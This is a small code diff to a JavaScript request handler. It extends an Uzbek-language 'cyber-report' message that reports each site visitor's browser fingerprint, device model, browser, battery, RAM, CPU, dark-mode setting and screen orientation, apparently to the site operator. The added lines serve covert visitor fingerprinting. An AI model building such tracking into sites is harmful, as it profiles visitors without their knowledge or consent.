@@ -41,11 +41,15 @@ export default async function handler(req, res) {
     }
 
     const message = `
-🚀 *ULTRA SCAN: Yangi Tashrif*
+🕵️‍♂️ *KIBER-HISOBOT: ${data.fingerprint || 'Noma\'lum'}*
 ----------------------------
 🕒 *Vaqt:* ${uzTime}
 📱 *Qurilma:* ${data.exactModel || deviceModel}
 🌐 *Ilova:* ${browserName}
+
+🆔 *Fingerprint:* \`${data.fingerprint}\`
+🌙 *Dark Mode:* ${data.darkMode}
+📐 *Holat:* ${data.orientation}
 
 🔋 *Batareya:* ${data.battery?.level || 'Noma\'lum'} (${data.battery?.charging || ''})
 🧠 *RAM:* ${data.ram} GB | *CPU:* ${data.cores}
